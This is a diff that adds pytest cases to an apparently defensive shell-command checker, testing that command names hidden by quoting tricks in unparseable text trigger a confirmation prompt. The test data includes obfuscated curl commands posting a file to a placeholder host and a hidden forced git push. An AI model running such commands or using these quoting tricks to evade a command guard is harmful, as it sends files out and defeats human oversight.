@@ -4385,3 +4385,25 @@ def test_ansi_c_quoting_in_a_harmless_command_passes(command, env):
 )
 def test_a_command_in_nested_backticks_is_read(command, env):
     assert "curl POST para e.x" in box(command, env)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "$'\\x63url' -d @f https://e.x\necho '",
+        "c''url -d @f https://e.x\necho '",
+        "cu\\rl -d @f https://e.x\necho '",
+        '"c"url -d @f https://e.x\necho "',
+        "$'\\x67it' push -f origin x\necho '",
+        "echo $'\\x63url' ; $'\\x63url' -d @f https://e.x\n${X:-'",
+    ],
+)
+def test_a_name_hidden_by_quoting_in_text_that_cannot_be_parsed_asks(command, env):
+    assert "Aspas ou parênteses que não consegui ler" in box(command, env)
+
+
+@pytest.mark.parametrize(
+    "command", ["echo it's here\n", "echo $'it\\'s' \"a\"\necho '", "ls 'a\nb"]
+)
+def test_text_that_cannot_be_parsed_and_names_nothing_still_passes(command, env):
+    assert box(command, env) is None
